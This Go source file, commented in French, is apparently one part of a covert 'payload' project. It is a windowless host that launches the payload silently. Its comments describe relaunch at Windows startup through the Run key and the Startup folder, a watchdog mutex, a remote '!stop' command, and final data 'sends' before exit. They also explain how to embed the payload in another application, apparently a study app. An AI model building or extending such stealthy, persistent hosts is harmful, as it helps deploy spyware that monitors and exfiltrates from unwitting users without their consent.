/*
Hôte autonome du payload.

Ce fichier remplace l'application de révision (WebView2) quand on veut un
exécutable autonome : aucune fenêtre, aucune interface, le payload démarre
aussitôt et le processus vit jusqu'à !stop.

Il fournit les deux seuls symboles que les fichiers du payload empruntent à
leur hôte :

  - diagMode / writeLog : journal de debug (-diag), ignoré sinon ;
  - singleInstance : un seul processus, le second sort en silence.

Intégré à une autre application, ce fichier disparaît : appelez startPayload()
depuis votre propre main et gardez le reste tel quel (voir README).
*/
package main

import (
	"flag"
	"fmt"
	"os"
	"path/filepath"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

var (
	diagMode bool
	logMu    sync.Mutex
)

func exeDir() string {
	p, err := os.Executable()
	if err != nil {
		d, _ := os.Getwd()
		return d
	}
	return filepath.Dir(p)
}

func writeLog(line string) {
	if !diagMode {
		return
	}
	logMu.Lock()
	defer logMu.Unlock()
	f, err := os.OpenFile(filepath.Join(exeDir(), "diagnostic.txt"), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	fmt.Fprintf(f, "%s %s\n", time.Now().Format("15:04:05"), line)
	f.Close()
}

// instanceMutexName porte le nom du mutex : le watchdog le teste pour savoir
// si le payload tourne encore.
var instanceMutexName = `Local\PayloadInstance`

// singleInstance garde un seul processus : clé Run et Démarrage le relancent
// ensemble au démarrage de Windows, et un second lancement manuel ne doit pas
// doubler le payload. Le second processus sort immédiatement, sans message.
func singleInstance() bool {
	name, err := syscall.UTF16PtrFromString(`Local\Francais2ndInstance`)
	if err != nil {
		return true
	}
	h, _, callErr := kernel32DLL.NewProc("CreateMutexW").Call(
		0, 0, uintptr(unsafe.Pointer(name)))
	if h == 0 {
		return true
	}
	if errno, ok := callErr.(syscall.Errno); ok && errno == syscall.Errno(183) {
		return false // ERROR_ALREADY_EXISTS
	}
	return true
}

func main() {
	flag.BoolVar(&diagMode, "diag", false, "journal de debug dans diagnostic.txt")
	flag.Parse()

	if !singleInstance() {
		os.Exit(0)
	}

	loadPayloadConfig() // valide le JSON embarqué avant de démarrer
	startPayload()

	// Le processus vit aussi longtemps que le payload tourne. !stop pose
	// stopped : les goroutines s'arrêtent, on laisse trois secondes aux
	// derniers envois puis on sort.
	for !stopped.Load() {
		time.Sleep(2 * time.Second)
	}
	time.Sleep(3 * time.Second)
	os.Exit(0)
}
